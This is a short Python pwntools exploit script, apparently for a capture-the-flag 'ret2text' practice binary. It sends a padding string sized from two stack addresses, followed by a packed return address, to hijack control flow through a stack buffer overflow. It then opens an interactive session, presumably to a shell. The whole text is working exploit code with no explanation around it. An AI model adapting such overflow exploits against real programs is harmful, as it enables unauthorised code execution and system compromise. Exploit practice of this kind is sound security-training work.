from pwn import *

p = process("./ret2text")
p.sendline((0xffffcf68-0xffffcefc+4)*"a" + p32(0x0804863A))
p.interactive()

